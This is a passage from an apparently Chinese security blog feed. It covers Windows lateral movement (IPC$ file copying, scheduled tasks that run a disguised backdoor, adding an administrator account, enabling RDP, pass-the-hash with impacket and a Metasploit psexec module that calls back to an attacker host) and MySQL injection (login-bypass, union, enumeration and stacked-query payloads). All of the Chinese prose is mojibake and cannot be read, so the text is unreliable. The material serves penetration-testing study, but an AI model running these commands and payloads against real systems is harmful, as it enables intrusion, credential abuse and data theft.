è·å¾—ç›¸åº”çš„æƒé™ï¼Œåœ¨è¿œç¨‹ç®¡ç†è®¡ç®—æœºå’ŒæŸ¥çœ‹è®¡ç®—æœºçš„å…±äº«èµ„æºæ—¶ä½¿ç”¨ã€‚</p></blockquote><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\ip /u:username password # å»ºç«‹ipc$è¿æ¥</span><br><span class="line"><span class="built_in">net</span> view \\ip # æŸ¥çœ‹ç›®æ ‡æœºå™¨çš„å…±äº«èµ„æº</span><br><span class="line"><span class="built_in">net</span> use z: \\IP\c$ # å°†ç›®æ ‡cç›˜æ˜ å°„ä¸ºæœ¬åœ°zç›˜</span><br><span class="line"><span class="built_in">dir</span> \\ip\ç›˜ç¬¦$\dir_path  # åˆ—å‡ºæŒ‡å®šç›®å½•æ–‡ä»¶</span><br><span class="line"><span class="built_in">copy</span> \\ip\ç›˜ç¬¦$\file save_path # ä¸‹è½½æ–‡ä»¶ save_pathä¸ºç»å¯¹è·¯å¾„/ä¿å­˜åˆ°å½“å‰ç›®å½•</span><br><span class="line"><span class="built_in">copy</span> file \\ip\ç›˜ç¬¦$\file # å¤åˆ¶æ–‡ä»¶</span><br><span class="line"><span class="built_in">net</span> use \\ip /<span class="built_in">del</span> /y # åˆ é™¤ipc$è¿æ¥</span><br></pre></td></tr></table></figure><ul><li><p>ç‰ˆæœ¬ï¼œWindows2012</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\ip # æŸ¥çœ‹ç›®æ ‡æœºå™¨æ—¶é—´</span><br><span class="line"><span class="built_in">at</span> \\ip <span class="built_in">time</span>(<span class="number">11</span>:<span class="number">12</span>) c:\<span class="number">1</span>.bat # åˆ›å»ºå®šæ—¶ä»»åŠ¡</span><br></pre></td></tr></table></figure></li><li><p>ç‰ˆæœ¬ï¼Windows2012</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> \\ip # æŸ¥çœ‹ç›®æ ‡æœºå™¨æ—¶é—´</span><br><span class="line"></span><br><span class="line">schtasks /create /tn &quot;task&quot; /tr c:\windows\temp\plugin_update.exe /sc once /st <span class="number">16</span>:<span class="number">32</span> /S ip /RU System /u username /p &quot;passwd&quot;</span><br><span class="line"># åˆ›å»ºè¯¥æ—¶é—´ä¹‹åçš„æŸä¸ªæ—¶åˆ»è‡ªåŠ¨æ‰§è¡Œä»»åŠ¡ï¼Œä»»åŠ¡å plugin_update</span><br><span class="line"></span><br><span class="line">schtasks /run /tn &quot;task&quot; /S ip /u username /p &quot;passwd&quot;</span><br><span class="line"># ç«‹å³è¿è¡Œåé—¨ç¨‹åº</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">schtasks /F /delete /tn &quot;task&quot; /S ip /u username /p &quot;passwd&quot;</span><br><span class="line"># åˆ é™¤åˆ›å»ºçš„ä»»åŠ¡</span><br></pre></td></tr></table></figure></li></ul><p>è¿™é‡Œæ·»åŠ äº†ç”¨æˆ·ï¼Œç”¨å¤–ç½‘æœºä½¿ç”¨ipc$ä¸åŸŸæ§å»ºç«‹è¿æ¥åï¼Œå‘ç°æ²¡æœ‰æƒé™</p><p><img src="/../images/image-20230331151440023-1686283281462.png" alt="image-20230331151440023"></p><p>è¿™æ˜¯å› ä¸ºæƒé™é—®é¢˜</p><p><a href="https://ares-x.com/2020/03/10/%E5%85%B3%E4%BA%8EIPC%E5%92%8CPTH%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98/">å…³äºIPCå’ŒPTHç”¨æˆ·æƒé™é—®é¢˜ | AresXâ€™s Blog</a></p><blockquote><p>å¯ä»¥å»ºç«‹ipc$è¿æ¥ï¼š</p><ul><li><p>åŸŸç”¨æˆ·ï¼Œå¹¶ä¸”è¯¥åŸŸç”¨æˆ·åœ¨è¿œç¨‹è®¡ç®—æœºçš„ç®¡ç†å‘˜ç»„ä¸­ã€‚</p></li><li><p>æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·</p></li></ul><p>ï¼ˆå¦‚æœæœ¬åœ°ç®¡ç†å‘˜ç»„å¯ç”¨äº†Administratorï¼Œé‚£ä¹ˆæœ¬åœ°ç®¡ç†å‘˜é‡Œåªæœ‰Administratoræ˜¯å¯ä»¥è¿æ¥çš„ï¼‰</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user khaz123 khaz777... /add</span><br><span class="line">net localgroup administrators username /add</span><br></pre></td></tr></table></figure><p>å°†khaz123ç”¨æˆ·æ·»åŠ åˆ°åŸŸæ§çš„æœ¬åœ°ç®¡ç†å‘˜ç»„ä¸­ï¼ˆå› ä¸ºæ˜¯åŸŸæ§æœåŠ¡å™¨æ·»åŠ ç”¨æˆ·ï¼Œè¯¥ç”¨æˆ·è‡ªåŠ¨ä¸ºåŸŸç”¨æˆ·ï¼‰ï¼Œipc$è¿æ¥æˆåŠŸ</p><p><img src="/../images/image-20230330235734609-1686283281462.png" alt="image-20230330235734609"></p><h4 id="è¿œç¨‹æ¡Œé¢è¿æ¥"><a href="#è¿œç¨‹æ¡Œé¢è¿æ¥" class="headerlink" title="è¿œç¨‹æ¡Œé¢è¿æ¥"></a>è¿œç¨‹æ¡Œé¢è¿æ¥</h4><p>åŒä¸€æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªç”¨æˆ·ç™»å½•</p><p><img src="/../images/image-20230331194248211-1686283281462.png" alt="image-20230331194248211"></p><h5 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">0</span> /f</span><br></pre></td></tr></table></figure><h5 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h5><blockquote><p>å®é™…ä¸Špost&#x2F;windows&#x2F;manage&#x2F;enable_rdpå°±æ˜¯åˆ©ç”¨äº†ä¸Šé¢windowsä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹å¼å¼€å¯3389ç«¯å£</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br><span class="line">rdesktop ip </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324160952786-1686283281462.png" alt="image-20230324160952786"></p><h4 id="PTH-å“ˆå¸Œä¼ é€’æ”»å‡»"><a href="#PTH-å“ˆå¸Œä¼ é€’æ”»å‡»" class="headerlink" title="PTH å“ˆå¸Œä¼ é€’æ”»å‡»"></a>PTH å“ˆå¸Œä¼ é€’æ”»å‡»</h4><blockquote><p>æŒ‘æˆ˜å“åº”æœºåˆ¶ï¼Œåªè¦çŸ¥é“NTLMå“ˆå¸Œï¼Œæ— éœ€çŸ¥é“æ˜æ–‡å¯†ç ï¼Œå°±å¯ä»¥é€šè¿‡è®¤è¯</p></blockquote><ul><li>impacket</li></ul><p>å®‰è£…ï¼š<code>sudo apt install python3-impacket</code></p><p><img src="/../images/image-20230331172307275-1686283281462.png" alt="image-20230331172307275"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains  xxx.py -hashes :91ff0fb948167eb4d080b5330686c02f  Administrator@192.168.52.138</span><br><span class="line"></span><br><span class="line">psexec.py</span><br><span class="line">smbexec.py</span><br><span class="line">wmiexec.py</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230331172323473-1686283281462.png" alt="image-20230331172323473"></p><p><img src="/../images/image-20230331172427568-1686283281462.png" alt="image-20230331172427568"></p><p><img src="/../images/image-20230331172508321-1686283281462.png" alt="image-20230331172508321"></p><ul><li><p>MSF</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set smbuser administrator</span><br><span class="line">set smbpass LM:NTLM</span><br><span class="line">set lhost 192.168.52.143</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li></ul><h4 id="PTTç¥¨æ®ä¼ é€’"><a href="#PTTç¥¨æ®ä¼ é€’" class="headerlink" title="PTTç¥¨æ®ä¼ é€’"></a>PTTç¥¨æ®ä¼ é€’</h4><blockquote><p>åªè¦çŸ¥é“äº†KDCå’ŒServerå¯†é’¥ï¼Œå³å¯ä¼ªé€ é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®</p></blockquote><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://blog.csdn.net/qq_44159028/article/details/124631522">https://blog.csdn.net/qq_44159028/article/details/124631522</a></p><p><a href="https://blog.51cto.com/u_15127677/4045185">https://blog.51cto.com/u_15127677/4045185</a></p><p><a href="https://soapffz.com/archives/558/">https://soapffz.com/archives/558/</a></p><p><a href="https://xz.aliyun.com/t/2536">åæ¸—é€ä¹‹meterpreterä½¿ç”¨æ”»ç•¥ - å…ˆçŸ¥ç¤¾åŒº</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é€šè¿‡mysqlå­¦ä¹ sqlæ³¨å…¥</title>
      <link href="/2023/05/31/%E9%80%9A%E8%BF%87Mysql%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/31/%E9%80%9A%E8%BF%87Mysql%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="äº§ç”ŸåŸå› "><a href="#äº§ç”ŸåŸå› " class="headerlink" title="äº§ç”ŸåŸå› "></a>äº§ç”ŸåŸå› </h2><p>æœåŠ¡å™¨å°†<strong>ç”¨æˆ·æäº¤çš„å‚æ•°</strong>é”™è¯¯åœ°<strong>æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­</strong>ï¼Œ<strong>æ‰“ç ´äº†æ•°æ®åŒºåŸŸçš„è¾¹ç•Œï¼ˆæ•°å­—å‹ä¸éœ€è¦ï¼‰æ”¹å˜äº†åŸæœ‰çš„sqlæ‰§è¡Œé€»è¾‘</strong>ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ‰§è¡Œæ¶æ„çš„sqlè¯­å¥ã€‚</p><p>ç®€å•çš„ä¾‹å­</p><p>å‡è®¾</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from users where id=&#x27;<span class="subst">$id</span>&#x27;;&quot;</span></span><br></pre></td></tr></table></figure><p>ç”¨æˆ·æäº¤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and 1=1 #</span></span><br></pre></td></tr></table></figure><p>æ‹¼æ¥åçš„sqlè¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=&#x27;1&#x27; and 1=1 #&#x27;</span><br></pre></td></tr></table></figure><p>è¦è¿›è¡Œæ³¨å…¥ï¼Œåªéœ€è¦å°†<code>and 1=1</code>éƒ¨åˆ†æ›¿æ¢ä¸ºå…¶ä»–sqlè¯­å¥å³å¯ã€‚</p><blockquote><p>å…¶å®åˆ†æ<code>sqlmap</code>çš„æ³¨å…¥ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œæ³¨å…¥è¯­å¥ç”±<code>prefix</code>ï¼Œ<code>payload</code>å’Œ<code>suffix</code>ç»„æˆ</p></blockquote><p>å›¾æ¥æº<a href="https://www.freebuf.com/column/161797.html">https://www.freebuf.com/column/161797.html</a></p><p><img src="/../images/image-20230522131723064.png" alt="image-20230522131723064"></p><h2 id="æ¼æ´å±å®³â€“æ”»å‡»é¢"><a href="#æ¼æ´å±å®³â€“æ”»å‡»é¢" class="headerlink" title="æ¼æ´å±å®³â€“æ”»å‡»é¢"></a>æ¼æ´å±å®³â€“æ”»å‡»é¢</h2><ul><li><p>æ‹¿åˆ°æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚æ‰‹æœºå·ï¼Œèº«ä»½è¯ï¼Œé‚®ç®±ï¼Œå®¶åº­åœ°å€ç­‰</p></li><li><p>åå°è´¦å·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸‡èƒ½å¯†ç ï¼Ÿè¿™å¹´å¤´è¿˜æœ‰å—ğŸ¤”</span><br><span class="line">æ‹¿åˆ°å¯†ç ï¼Œä½†æ˜¯ä¸€èˆ¬å¯†ç éƒ½æ˜¯åŠ ç›å†åŠ å¯†çš„äº†å§ï¼Œéœ€è¦å½©è™¹è¡¨å•¥çš„ã€‚</span><br><span class="line">æˆ–è€…å †å æ³¨å…¥åˆ›å»ºä¸€ä¸ªï¼Œä¿®æ”¹ä¸€ä¸ªç­‰                       </span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶ä»»æ„è¯»å–</p></li><li><p>Getshell</p></li><li><p>RCE</p></li><li><p>ææƒ</p></li></ul><h2 id="å¦‚ä½•åˆ©ç”¨"><a href="#å¦‚ä½•åˆ©ç”¨" class="headerlink" title="å¦‚ä½•åˆ©ç”¨"></a>å¦‚ä½•åˆ©ç”¨</h2><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p><img src="/../images/image-20230522131900429.png" alt="image-20230522131900429"></p><h4 id="ç«™åº“åˆ†ç¦»"><a href="#ç«™åº“åˆ†ç¦»" class="headerlink" title="ç«™åº“åˆ†ç¦»"></a>ç«™åº“åˆ†ç¦»</h4><h5 id="ä¸ºä»€ä¹ˆ"><a href="#ä¸ºä»€ä¹ˆ" class="headerlink" title="ä¸ºä»€ä¹ˆ"></a>ä¸ºä»€ä¹ˆ</h5><p>ç«™åº“åˆ†ç¦»ï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡æ•°æ®åº“è¿›è¡Œè¯»å†™</p><h5 id="åˆ¤æ–­æ–¹æ³•"><a href="#åˆ¤æ–­æ–¹æ³•" class="headerlink" title="åˆ¤æ–­æ–¹æ³•"></a>åˆ¤æ–­æ–¹æ³•</h5><ul><li><p>é€šç”¨æ–¹æ³•</p><p>è¯»å–é…ç½®æ–‡ä»¶ï¼Œåˆ¤æ–­IP</p></li><li><p>Mysql</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@hostname; //æœåŠ¡ç«¯ä¸»æœºåç§° select * from information_schema.PROCESSLIST; //å®¢æˆ·ç«¯ä¸»æœºåç§°å’Œç«¯å£</span><br></pre></td></tr></table></figure><blockquote><p>Windowsè¿æ¥æ ¼å¼ï¼šä¸»æœºå:Port</p><p>Linuxè¿æ¥æ ¼å¼ï¼šIP:Port</p><p>æœ¬åœ°è¿æ¥æ ¼å¼ï¼šlocalhost:Port</p></blockquote><p><img src="/../images/image-20230522203905326.png" alt="image-20230522203905326"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user()ï¼›</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœä¸æ˜¯localhostï¼Œå¤§æ¦‚ç‡æ˜¯ç«™åº“åˆ†ç¦»ã€‚</p></blockquote><p><img src="/../images/image-20230522204233420.png" alt="image-20230522204233420"></p></li></ul><h4 id="æ•°æ®åº“ç±»å‹"><a href="#æ•°æ®åº“ç±»å‹" class="headerlink" title="æ•°æ®åº“ç±»å‹"></a>æ•°æ®åº“ç±»å‹</h4><p><img src="/../images/image-20230519205623244-1685603526750.png"></p><h4 id="å„ç§ä¿¡æ¯"><a href="#å„ç§ä¿¡æ¯" class="headerlink" title="å„ç§ä¿¡æ¯"></a>å„ç§ä¿¡æ¯</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ifnull(@@secure_file_priv,0) secure_file_privä¸ºç©ºæ—¶è¿”å›0,ä¸ä¸ºç©ºæ—¶è¿”å›å…¶å€¼</span><br><span class="line">SELECT concat_ws(0x0a,</span><br><span class="line">ifnull(@@secure_file_priv,0),</span><br><span class="line">concat_ws(0xefbc8c, @@version, @@version_compile_os, @@version_compile_machine, @@version_comment),</span><br><span class="line">concat_ws(0xefbc8c, @@hostname, @@port),</span><br><span class="line">concat_ws(0xefbc8c, user(), database()),</span><br><span class="line">concat_ws(0xefbc8c, @@datadir, @@plugin_dir, @@tmpdir, @@basedir)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ç»“æœ</span><br><span class="line">0</span><br><span class="line">10.5.8-MariaDB-3ï¼Œdebian-linux-gnuï¼Œx86_64ï¼ŒDebian buildd-unstable</span><br><span class="line">kaliï¼Œ3306</span><br><span class="line">root@localhost</span><br><span class="line">/var/lib/mysql/ï¼Œ/usr/lib/mysql/plugin/ï¼Œ/tmpï¼Œ/usr</span><br></pre></td></tr></table></figure><h3 id="åˆ¤æ–­"><a href="#åˆ¤æ–­" class="headerlink" title="åˆ¤æ–­"></a>åˆ¤æ–­</h3><h4 id="æ³¨å…¥ç‚¹"><a href="#æ³¨å…¥ç‚¹" class="headerlink" title="æ³¨å…¥ç‚¹"></a>æ³¨å…¥ç‚¹</h4><p>ä¸€åˆ‡ä¸æ•°æ®åº“æœ‰äº¤äº’çš„åœ°æ–¹ï¼Œå–å†³äºåç«¯ä»HTTPè¯·æ±‚æŠ¥æ–‡ä¸­æå–äº†ä»€ä¹ˆæ•°æ®å¹¶æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­ã€‚</p><h4 id="æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥"><a href="#æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥" class="headerlink" title="æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥"></a>æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥</h4><ul><li><p>å­—ç¬¦å‹oræ•°å­—å‹ï¼šfuzzé—­åˆç±»å‹</p></li><li><p>æ˜¯å¦æœ‰æŠ¥é”™ï¼Œæ˜¯å¦èƒ½é€ƒé€¸æ‰§è¡Œsqlè¯­å¥ï¼ˆé€»è¾‘ï¼Œå»¶æ—¶ç­‰åˆ¤æ–­ï¼‰</p></li></ul><h4 id="åç«¯è¯­å¥"><a href="#åç«¯è¯­å¥" class="headerlink" title="åç«¯è¯­å¥"></a>åç«¯è¯­å¥</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># å¾—åˆ°åç«¯æ‰§è¡Œçš„sqlè¯­å¥</span><br><span class="line">select * from test.users where id=1 union SELECT (select INFO FROM INFORMATION_SCHEMA.PROCESSLIST WHERE INFO LIKE &#x27;%673245283%&#x27; LIMIT</span><br><span class="line"> 1),2,3;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230528210843123.png" alt="image-20230528210843123"></p><h3 id="Mysqlæ³¨å…¥æ‰‹æ®µ"><a href="#Mysqlæ³¨å…¥æ‰‹æ®µ" class="headerlink" title="Mysqlæ³¨å…¥æ‰‹æ®µ"></a>Mysqlæ³¨å…¥æ‰‹æ®µ</h3><h4 id="adminç™»å…¥"><a href="#adminç™»å…¥" class="headerlink" title="adminç™»å…¥"></a>adminç™»å…¥</h4><ul><li><p>ä¸‡èƒ½å¯†ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åç«¯ä»£ç Demo</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="subst">$user</span>&#x27; and passwd=&#x27;<span class="subst">$passwd</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ç™»é™†æˆåŠŸ&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡å¸ƒå°”è¿ç®—è®©whereæ’ä¸ºçœŸ</p><p><img src="/../images/image-20230312212035948.png" alt="image-20230312212035948"></p></li><li><p>æ³¨å†Œè¦†ç›–</p><blockquote><p>admin (æœ‰ä¸ªç©ºæ ¼)æˆ–è€… (æœ‰ä¸ªç©ºæ ¼)admin</p><p>åŸç†ï¼šç”¨æˆ·åå­—æ®µé•¿åº¦&gt;5ï¼Œæ‰€ä»¥å¯ä»¥æ·»åŠ ç©ºæ ¼ï¼Œè€Œsqlè¯­å¥æ‰§è¡Œæ—¶ä¼šå°†ç©ºæ ¼å¿½ç•¥ã€‚</p></blockquote><p><img src="/../images/image-20230312210909402.png" alt="image-20230312210909402"></p></li><li><p>è”åˆæŸ¥è¯¢æ„é€ ä¸´æ—¶ç”¨æˆ·</p><p><code>[GXYCTF2019]BabySQli</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åç«¯ä»£ç Demo</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM manage WHERE user=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;</span>.<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="variable">$users</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$result</span>)) &#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;æŠ±æ­‰ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ã€‚&#x27;);history.back();&lt;/Script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$passwords</span>=<span class="variable">$users</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)&lt;&gt;<span class="variable">$passwords</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;Script language=JavaScript&gt;alert(&#x27;æŠ±æ­‰ï¼Œç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯ã€‚&#x27;);history.back();&lt;/Script&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ç™»é™†æˆåŠŸ&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27; union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27; limit 1,2--+</span><br><span class="line"></span><br><span class="line">passwd=c4ca4238a0b923820dcc509a6f75849b</span><br><span class="line"></span><br><span class="line">MD5(1)=c4ca4238a0b923820dcc509a6f75849b</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230312215147770.png" alt="image-20230312215147770"></p></li></ul><h4 id="è”åˆæŸ¥è¯¢æ³¨å…¥"><a href="#è”åˆæŸ¥è¯¢æ³¨å…¥" class="headerlink" title="è”åˆæŸ¥è¯¢æ³¨å…¥"></a>è”åˆæŸ¥è¯¢æ³¨å…¥</h4><h5 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h5><p>sqlè¯­å¥ä¸º<code>select</code>,é¡µé¢æœ‰å›æ˜¾æŸ¥è¯¢ç»“æœã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users where id=<span class="subst">$id</span> &quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br></pre></td></tr></table></figure><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p><strong>å…ˆé€šè¿‡order byç­‰è¯­å¥åˆ¤æ–­åˆ—æ•°ï¼Œå†åˆ¤æ–­å“ªä¸€åˆ—æ˜¯è¾“å‡ºç‚¹ï¼Œæœ€åè¿›è¡Œæ³¨å…¥</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è”åˆæŸ¥è¯¢ï¼Œè·å–åº“å</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(schema_name),3 from information_schema.schemata#</span><br><span class="line"></span><br><span class="line">è”åˆæŸ¥è¯¢ï¼Œè·å–è¡¨å </span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;å·²çŸ¥åº“å&#x27;#</span><br><span class="line"></span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(table_name) from mysql.innodb_table_stats where database_name=&#x27;å·²çŸ¥åº“å&#x27;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è”åˆæŸ¥è¯¢ï¼Œè·å–å­—æ®µå</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;å·²çŸ¥è¡¨å&#x27;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è”åˆæŸ¥è¯¢ï¼Œè·å–å­—æ®µå€¼</span><br><span class="line">?id=-1&quot;union select 1,2,group_concat(å­—æ®µ1ï¼Œå­—æ®µ2...) from å·²çŸ¥è¡¨å#</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼š</p><p>å› ä¸ºåç«¯æŸ¥è¯¢è¯­å¥å¯èƒ½åªæ‹¿ç¬¬ä¸€è¡ŒæŸ¥è¯¢ç»“æœå¦‚<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code>ï¼Œæ‰€ä»¥éœ€è¦æ„é€ ä¸€ä¸ªä¸å­˜åœ¨çš„å€¼å¦‚-1ï¼Œä½¿å¾—è”åˆæŸ¥è¯¢çš„ç»“æœæˆä¸ºç¬¬ä¸€è¡Œï¼›</p><p>è¦æŸ¥çš„è¡¨çš„åç§°(è¿™ä¸ªè¡¨æ˜¯ä¸æ˜¯åœ¨ç°åœ¨ä½¿ç”¨çš„æ•°æ®åº“ä¸­ï¼Œæ²¡æœ‰çš„è¯è¡¨å&#x3D;æ•°æ®åº“.è¡¨å)</p></blockquote><h4 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h4><h5 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h5><blockquote><p>åç«¯ä½¿ç”¨çš„æŸ¥è¯¢å‡½æ•°ä¸º<code>mysqli_multi_query()</code> ï¼Œæ”¯æŒå¤šæ¡è¯­å¥æŸ¥è¯¢</p><p>è€Œä¸æ˜¯<code>mysqli_query()</code> ï¼Œä»…æ”¯æŒä¸€æ¡è¯­å¥æŸ¥è¯¢</p></blockquote><h5 id="å±€é™æ€§"><a href="#å±€é™æ€§" class="headerlink" title="å±€é™æ€§"></a>å±€é™æ€§</h5><ul><li><p>å¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ° API æˆ–è€…æ•°æ®åº“å¼•æ“çš„å½±å“</p></li><li><p>æ— å›æ˜¾ï¼šåœ¨ Web ä¸­ä»£ç é€šå¸¸åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œå› æ­¤ï¼Œå †å æ³¨å…¥ç¬¬äºŒä¸ªè¯­å¥äº§ç”Ÿé”™è¯¯æˆ–è€…ç»“æœåªèƒ½è¢«å¿½ç•¥</p><p><strong>è§£å†³æ–¹æ³•</strong>ï¼šå¯ä»¥é€šè¿‡å…ˆå°†å†…å®¹æ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œç„¶åå†é€šè¿‡æŸ¥è¯¢æŸ¥å‡ºæ¥</p></li></ul><h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;;sqlè¯­å¥;--+</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥ä»»æ„æ‰§è¡Œsqlè¯­å¥ï¼Œå±å®³å¾ˆå¤§</p><h6 id="é…åˆhandleç»•è¿‡å…³é”®å­—"><a href="#é…åˆhandleç»•è¿‡å…³é”®å­—" class="headerlink" title="é…åˆhandleç»•è¿‡å…³é”®å­—"></a>é…åˆhandleç»•è¿‡å…³é”®å­—</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler è¡¨å  open ; handler è¡¨å read first; 